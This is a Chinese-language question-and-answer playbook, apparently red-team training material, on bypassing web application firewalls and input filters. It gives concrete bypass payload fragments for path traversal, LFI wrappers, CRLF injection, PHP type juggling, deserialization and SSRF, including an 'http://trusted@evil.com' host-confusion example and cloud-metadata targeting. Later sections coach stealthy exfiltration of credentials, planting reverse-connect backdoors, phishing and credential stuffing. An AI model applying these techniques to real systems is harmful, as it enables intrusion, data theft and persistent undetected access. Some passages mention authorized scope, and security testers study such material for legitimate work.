**Q3**: 怎么发现目标信任哪些 header?
**A3**: 观察响应对不同 header 的反应(某 header 一加就变行为)、泄露的框架/中间件默认信任列表、JS/配置里出现的自定义头名。让行为变化告诉你哪个头被信任。
**Q4**: header 伪造全无效,访问控制在应用层做得很扎实,往哪转?
**A4**: 转越权维度:换用低权账号访问高权接口(垂直越权)、改资源 ID 访问他人数据(水平越权/IDOR)、找忘了鉴权的接口(通常是新接口、内部接口、导出/回调接口)。信任头封死就攻鉴权覆盖的遗漏点。
**Q5**: 这类绕过的高价值目标是哪些?
**A5**: 管理后台、actuator/监控端点、内部 API 网关、调试接口。它们常假设"能到达=可信"而疏于鉴权,是信任头伪造的高产区。

### 从"被过滤"反推目标技术栈
**Q1**: 我该怎么利用"什么被过滤"这个信息本身?
**A1**: 过滤规则暴露技术栈。若它专拦 `union select` 而不管 NoSQL 语法,后端多半是 SQL;若拦 `{{}}` 说明可能有模板引擎;拦 `../` 说明有文件操作面。防御规则是防御者对"自己有什么漏洞面"的自供状。
**Q2**: 具体怎么用这个推断指导下一步?
**A2**: 反向选打法:它重点防 SQLi 说明这里可能真有 SQL 交互,值得深挖 SQLi 的绕过而非放弃;它完全不防某类(如 SSTI/反序列化)可能是防御盲区,优先试那类。防御强度分布=攻击优先级的反向指引,但要警惕两种解读并存。
**Q3**: 如何区分"没防某类=没这个面" vs "没防=盲区"?
**A3**: 主动发探针确认攻击面存在性(如 SSTI 数学探针、反序列化 magic bytes 探测)。先证明"面存在"再判断"防御缺失是盲区"。不能只凭没拦就断定有盲区。
**Q4**: 这套推断把我引向死胡同(推错技术栈)怎么办?
**A4**: 回到直接指纹:报错信息、响应头(`X-Powered-By`、`Server`)、cookie 名(`PHPSESSID`/`JSESSIONID`/`csrftoken`)、404 页面风格、静态资源路径。用硬指纹校正从过滤规则做的软推断。
**Q5**: 技术栈确认后如何收敛 payload?
**A5**: 只带该栈相关的绕过变体(如确认是 PHP 就用 PHP 特有的类型混淆、弱比较、`$_REQUEST` 污染),丢弃其它栈的无关尝试。收敛搜索空间提高效率。

### 弱类型 / 松散比较绕过过滤逻辑
**Q1**: 过滤逻辑用 `==`/黑名单比较,弱类型语言里怎么绕?
**A1**: 利用类型混淆:PHP 里 `0e123 == 0`(科学计数)、数组绕过 `strcmp` 返回 null、`in_array` 松散模式、magic hash 碰撞。若过滤/校验依赖松散比较,喂它一个类型让比较结果偏离开发者预期。
**Q2**: 具体在什么场景最该想到弱类型绕过?
**A2**: 登录/token 校验(`if($hash == $input)`)、白名单校验(`in_array($x, $allow)`)、开关判断。凡是"用户输入参与松散比较且结果决定放行"的地方都是候选。
**Q3**: 目标是强类型语言(Java/Go)呢,这招失效怎么办?
**A3**: 转该语言的等价怪癖:Java 的对象反序列化、`.equals` vs `==`、整数溢出;或转编码/规范化不一致。弱类型绕过是语言特定的,换语言就换武器库,不硬套。
**Q4**: 怎么先确认后端是弱类型语言?
**A4**: 看指纹(`X-Powered-By: PHP`、cookie、报错栈),或发类型探针:传 `param[]=x`(数组)看是否报 "array to string"、传 `0e1` 看行为。用一个类型畸形输入探出语言的类型处理性格。
**Q5**: 弱类型绕过成功后要注意什么?
**A5**: 这类绕过常极不稳定(依赖具体版本/配置),拿到即用、尽快固化战果(拿 token/建立立足点),别指望它长期可靠。

### 通配符 / 正则回溯攻击过滤器本身
**Q1**: 过滤用正则做,能不能攻击正则本身?
**A1**: 能。若过滤正则写得差(嵌套量词、可回溯结构),构造能触发灾难性回溯(ReDoS)的输入让过滤器 CPU 打满/超时,可能导致过滤被跳过或服务拒绝。判据:过滤正则是否含 `(a+)+`、`(.*)*` 类危险结构。
**Q2**: 怎么探测过滤正则是否脆弱?
**A2**: 发递增长度的边界输入,观察响应时间是否指数级增长。时间随输入长度爆炸=存在回溯脆弱点。用时间曲线判断。
**Q3**: 正则不脆弱,或攻击它没意义,往哪转?
**A3**: 转"让正则匹配不到但后端仍解析"的输入:正则常锚定不当(没加 `^$`、多行 `m` 模式漏洞、`.` 不匹配换行),用换行 `%0a` 把 payload 藏到正则视野外。攻正则的锚定/多行盲区比攻回溯更实用。
**Q4**: 正则锚定也严谨呢?
**A4**: 转 payload 里插入正则会忽略但后端会处理的内容(某些注释、空白、控制字符),制造"正则看到的字符串"与"后端使用的字符串"不一致。核心永远是制造两个组件对同一输入的理解差。
**Q5**: 这类攻击的风险?
**A5**: ReDoS 可能拖垮服务影响可用性,授权范围内谨慎使用;优先用非破坏性的"锚定绕过"而非 ReDoS。能用绕过就不用 DoS。

### 面对未知 WAF 的系统化 fuzz 策略
**Q1**: 完全不认识这个 WAF,也查不到公开 bypass,怎么系统化找绕过?
**A1**: 建立正交变体矩阵,分维度批量 fuzz:编码维度(URL/双 URL/Unicode/HTML)× 大小写维度 × 空白替换维度 × 注释插入维度 × 位置维度(query/body/header/cookie)× Content-Type 维度。每维独立试,记录拦放,找出"通过率高"的维度组合。
**Q2**: 变体空间爆炸,怎么控制成本?
**A2**: 分层剪枝:先单维度各试少量代表,淘汰全拦的维度,只在"有通过"的维度上做组合。别一开始就笛卡尔全组合,先找有信号的轴再深入。
**Q3**: fuzz 全程被限速打断怎么办?
**A3**: 转基础设施:降速+代理轮换保证 fuzz 能跑完(见限速转向),或缩小到最有希望的少数变体精打。fuzz 的前提是能持续发请求,先解决通道。
**Q4**: 整个变体矩阵跑完没有任何一个通过,往哪转?
**A4**: 说明 payload 层面这个点很难绕,转正交战场:换注入点、换漏洞类型、换 Content-Type/协议层、绕过整个 WAF(源站直连)、或转逻辑漏洞。一个点 fuzz 到底不通就换点,别在一棵树上吊死。
**Q5**: 找到通过的变体后如何最大化利用?
**A5**: 固化成该目标的"绕过模板",套用到所有同类注入点,并组合真正的攻击 payload(先验证载体通过,再往里装弹头)。区分"运输层通过"和"弹头有效"两步验证。

### payload 通过 WAF 但攻击没生效的排错
**Q1**: 变体成功绕过 WAF(不再被拦),但漏洞好像没触发,问题在哪?
**A1**: 分离"绕过"和"利用"两个环节。绕过成功≠利用成功。可能是绕过用的编码/变形破坏了 payload 语义(如注释插错位置改变了 SQL 逻辑)。回退到"无 WAF 环境下已知有效的 payload",逐步施加绕过变形,找到哪一步既过 WAF 又保语义。
**Q2**: 怎么确认 payload 本身在无 WAF 时是有效的?
**A2**: 先在不触发 WAF 的等价简单注入(如纯数字盲注探针)上验证漏洞存在与语法正确,再叠加绕过。先证明"洞真存在且我的语法对",再解决"过 WAF"。别把 payload 写错当成 WAF 拦。
**Q3**: 语义没坏但还是不生效呢?
**A3**: 检查上下文假设:注入点的引号闭合、字段类型、注释符是否匹配后端(`--`、`#`、`/**/`)、列数、数据类型。绕过成功后利用失败,十有八九是注入上下文没对准,而非 WAF。
**Q4**: 反复调都不生效,怀疑根本没洞,往哪转?
**A4**: 转验证漏洞真实性:换更明确的探针(时间盲的确定性延迟、OOB 的确定性回连)确认后端是否真的执行了我的输入。若确认没执行,则此点无洞,转下一个攻击面。别在无洞点上无限调 payload。
**Q5**: 怎么避免这类"绕过成功假象"浪费时间?
**A5**: 始终维护两条基线:一条"必被 WAF 拦"确认 WAF 在工作,一条"无 WAF 时必生效"确认 payload 正确。两条基线夹住,任何异常都能快速归因到 WAF 还是 payload。

### 静态资源 / 特殊路径的 WAF 豁免
**Q1**: 听说把攻击藏进静态资源路径能绕 WAF,原理是什么?
**A1**: WAF 常对静态资源(`.js`/`.css`/`.jpg`/`.woff`)和特定路径(健康检查、静态目录)配置豁免以省算力。若能让恶意请求"看起来像"访问静态资源(路径后缀伪装、`;.js`、`/static/../` 穿越),可能落入豁免规则。
**Q2**: 怎么伪装成静态资源?
**A2**: 试路径参数注入(`/api/x;.js`、`/api/x?.css`)、matrix 参数、PathInfo(`/api/x/foo.js`),让 WAF 按后缀判为静态而后端按路由正常处理。利用 WAF 与路由框架对"路径"理解的差异。
**Q3**: 静态豁免不存在或伪装无效,还有别的豁免面吗?
**A3**: 试 WAF 可能不检测的 HTTP 方法(`OPTIONS`/`TRACE`/`PUT`/自定义 verb)、特定 Host、特定内部路径。豁免面 = WAF 部署时人为开的口子,枚举方法/路径/Host 找那个口子。
**Q4**: 所有豁免面都试遍没有缝,往哪转?
**A4**: 说明 WAF 部署严谨无豁免盲区,转回 payload 语义绕过或绕过整层(源站直连)。豁免面是"部署配置漏洞",没有就回到"规则对抗"或"架构绕过"。
**Q5**: 怎么快速探出豁免路径?
**A5**: 对已知会被拦的 payload,套用到不同路径后缀/方法/前缀,看哪个组合突然不拦了。用"同 payload 不同外壳"批量探豁免边界。

### 反序列化 payload 过 WAF 的特殊考量
**Q1**: 要打反序列化,payload 是二进制/base64,WAF 会拦吗?怎么处理?
**A1**: 反序列化 payload 常是编码后的二进制块(Java 的 `rO0`、PHP 的 `O:`、.NET 的 base64),WAF 若只做关键字匹配可能整块看不懂而放行,但有的 WAF 专门检测这些 magic 前缀。先探它是否识别序列化特征头。
**Q2**: 若 WAF 拦序列化特征(如 base64 后的 `rO0`)怎么办?
**A2**: 变形序列化流:改用不同序列化格式(若目标支持多种)、对 base64 做变体(补位、换行、URL-safe)、用 gzip 压缩序列化流再传(很多框架接受压缩流,WAF 却看不穿压缩)。压缩是反序列化过 WAF 的利器。
**Q3**: gadget chain 里的类名/命令字符串被 WAF 识别呢?
**A3**: 换 gadget 链(不同链有不同字节特征)、在链里避开高危明文命令(用编码/间接执行)、或把命令放到 payload 中 WAF 看不到的深层。反序列化的绕过空间在"格式编码"和"gadget 选择"两个层面。
**Q4**: 反序列化点被 WAF 死盯或 RASP hook 了危险 gadget,往哪转?
**A4**: 转不经过被 hook gadget 的利用链(纯 SSRF/文件写 gadget 而非命令执行 gadget),或转其它入口。RASP 常 hook 命令执行,但对"反序列化触发的文件写/SSRF"覆盖较弱,绕开被监控的终点。
**Q5**: 怎么先低风险确认反序列化点存在?
**A5**: 用 OOB 探针 gadget(仅触发 DNS/HTTP 回连不执行命令)确认反序列化被触发且出网可达,再上重 payload。先确认"链能通、能触发"再投递高危 gadget,避免暴露和浪费。

### 何时放弃绕过 WAF 转攻其它资产
**Q1**: 在一个点上和 WAF 缠斗很久没进展,怎么判断该不该撤?
**A1**: 算性价比:已投入时间、剩余变体空间、该点若打通的价值。若变体矩阵基本试遍、该点即使拿下也只是低价值信息,就该撤。红队目标是拿下目标而非征服某个 WAF,别陷入沉没成本。
**Q2**: 撤了往哪去?
**A2**: 转攻击面广度:同目标的其它子域、其它端口/服务、其它应用、旁站、供应链/第三方组件、以及非 Web 面(邮件、VPN、暴露的管理服务)。WAF 通常只护主 Web 入口,边缘资产常裸奔。
**Q3**: 怎么系统找这些"WAF 覆盖不到"的资产?
**A3**: 子域枚举、端口扫描、证书透明度、历史资产、云存储桶、测试/预发环境(`test.`/`dev.`/`uat.`)。测试环境常无 WAF 且配置宽松,是绕过整个防护体系的高价值目标。
**Q4**: 其它资产也都有防护呢?
**A4**: 转"人"和"链":社工面(钓鱼)、泄露凭证复用(撞库)、公开代码仓库泄露的密钥、第三方供应商。当技术面全硬,转向信任链和身份是常规升级路径。
**Q5**: 什么信号提示"不该撤、该坚持"?
**A5**: 若已观察到明确的漏洞存在信号(报错、时序差异、部分绕过成功),说明洞真实存在只差绕过临门一脚,值得再投入。有"洞确实在"的证据就坚持,纯盲猜无信号就撤。

### 绕过成功后避免触发行为告警
**Q1**: 已经绕过 WAF 拿到注入了,接下来大量取数会不会又触发告警?
**A1**: 会。WAF/风控除了规则匹配还有行为基线(请求频率、异常数据量、敏感表访问)。绕过了规则不等于绕过了行为检测。取数阶段要控制节奏、分散、模拟正常查询量。
**Q2**: 怎么低调地把数据拿出来?
**A2**: 小批量、拉长时间、优先拿最高价值数据(凭证、密钥、可横向的信息)而非全量拖库。夹带在正常业务时段。目标是"够用即走"而非"最大化拖取"触发大流量告警。
**Q3**: 发现取数已触发告警(响应变化/开始拦截)怎么办?
**A3**: 立即降速或暂停,转为"一次拿到最关键信息"的精准查询(直接读 admin 凭证/密钥表),然后转移到已建立的更隐蔽立足点。告警一起,从"广度采集"切"精准提取+撤离"。
**Q4**: 想持久化访问,不想每次都过 WAF 怎么办?
**A4**: 转建立带外通道:拿到 RCE 后种植不经过 Web 前门的后门(反连、独立端口、合法服务隧道),后续操作绕开整个 WAF/Web 监控。从"每次穿 WAF"升级为"绕过 Web 通道本身"。
**Q5**: 决策原则是什么?
**A5**: 绕过 WAF 只是"进门",真正的对抗是进门后的隐蔽性。始终以"最小暴露拿到最大价值并可持续"为准绳,而非炫技式地反复挑战 WAF。

### CRLF / header 注入绕过与利用
**Q1**: 参数被回显到响应 header 里,能不能利用?
**A1**: 试 CRLF 注入:注入 `%0d%0a` 换行符,若未过滤可注入新 header(`Set-Cookie`、`Location`)甚至分割响应体(HTTP response splitting)造成 XSS/缓存投毒。判据:输入是否进入响应头且换行未被过滤。
**Q2**: `%0d%0a` 被过滤或规范化了怎么办?
**A2**: 试等价换行编码:`%0a` 单独、`%0d` 单独、Unicode 换行(`%e5%98%8a%e5%98%8d` 等 overlong/宽字节在某些解析器被折成 CR/LF)、`\r\n` 的其它编码表示。换行注入常败在编码规范化,换编码变体是主线。
**Q3**: CRLF 打不通,但这个 header 反射点还有别的用吗?
**A3**: 转 Host 头攻击(密码重置投毒、路由绕过)、缓存投毒(污染可缓存响应)、或该反射本身作为 XSS/开放跳转点。header 反射面的价值不止 CRLF。
**Q4**: 都无效,往哪转?
**A4**: 转其它污染下游的输入(见 Host/信任头条),或放弃 header 面回到 body 参数注入。header 注入是特定条件漏洞,条件不满足就换面。
**Q5**: 怎么判断反射进了 header 而非 body?
**A5**: 发一个探针值,在完整响应(含所有 header)里搜它出现在哪。出现在 header 区才有 CRLF 面,只在 body 则走 XSS/注入面。看落点决定打法。

### 路径穿越 / LFI 过滤的绕过决策
**Q1**: 文件读取参数把 `../` 过滤了,路径穿越还能打吗?
**A1**: 能。先分清是"替换一次"还是"递归剥离"。若只替换一次,用 `....//`(剥掉中间 `../` 后重组成 `../`)、`..%2f`、`..\`、嵌套 `..././`。若递归剥离则换编码层(URL 双编码 `%252e%252e%252f`、overlong UTF-8)。判据是过滤是一次性还是循环。
**Q2**: 有 `.php`/固定后缀拼接,读不到任意文件怎么办?
**A2**: 想办法截断或吞掉后缀:老版本用 `%00` 截断;或利用路径长度截断;或干脆不读文件而用协议包装器(`php://filter` 读源码 base64、`php://input`/`data://` 打 RCE、`zip://`/`phar://` 触发反序列化)。后缀拼死了就换 wrapper 维度。
**Q3**: 有 basedir 限制或只允许特定目录前缀呢?
**A3**: 用前缀满足+穿越组合(`/allowed/../../etc/xxx`),让路径既以白名单前缀开头又穿越出去;或找允许目录内的软链、上传点落地文件、日志文件(日志投毒→LFI 到 RCE)。前缀校验常挡不住前缀之后的穿越。
**Q4**: 各种穿越编码全被规范化拦死,往哪转?
**A4**: 转"不靠穿越"的读取/执行:LFI 到 RCE 的经典组合(包含 session 文件、日志、`/proc/self/environ`、上传的图片马、`phar` 反序列化),或换成 SSRF/XXE 等其它读文件原语。穿越被封不代表读文件能力被封,换取文件的机制。
**Q5**: 怎么先确认穿越确实生效(而非被静默过滤)?
**A5**: 用确定性存在的文件做探针(如返回内容特征明显的系统文件),对比"穿越 payload"与"直接读白名单文件"的响应差异。有明确内容回显或长度差才算穿越成功,别被空响应误导。

### 开放跳转 / SSRF 过滤的 URL 绕过
**Q1**: 一个 URL 参数做了域名白名单校验(防 SSRF/开放跳转),怎么绕?
**A1**: 攻击 URL 解析不一致:`@` 混淆(`http://trusted@evil.com`)、`#`/`?` 截断、子域伪装(`trusted.evil.com`)、反斜杠(`http://trusted\@evil.com`)、省略斜杠。不同 URL 解析库对"host 到底是谁"理解不同,校验库和请求库理解不一致就是绕过口。
**Q2**: 针对 SSRF 的 IP 白名单/内网拦截怎么绕?
**A2**: IP 表示变形:十进制/十六进制/八进制 IP、`0`/`0.0.0.0`/`[::]`、IPv6、DNS rebinding(校验时解析成公网、请求时解析成内网)、`localhost` 的各种别名。内网拦截常只黑名单了 `127.0.0.1`/`10.x` 字面量,换表示法即绕。
**Q3**: 协议被限制为 `http/https` 怎么办(想读文件/打内网服务)?
**A3**: 若解析宽松试 `file://`/`gopher://`/`dict://`;若严格限于 http,则用 http SSRF 打内网 HTTP 服务(元数据接口、内部管理页)。协议受限就在允许的协议内找高价值内网目标。
**Q4**: 所有 URL 变形都被规范化拦掉,往哪转?
**A4**: 转 DNS rebinding(绕过一切基于"解析结果"的校验,因为它在校验后请求前改变解析)或找允许的重定向链(白名单域上的开放跳转把你带到内网)。当直接构造被封,用"时间差"(rebinding)或"借力"(跳转链)。
**Q5**: SSRF 打通后往哪走?
**A5**: 优先探云元数据服务(取临时凭证)、内网服务发现(端口探测)、内部未授权接口。SSRF 的价值在打通后的内网纵深,绕过校验只是入场券。
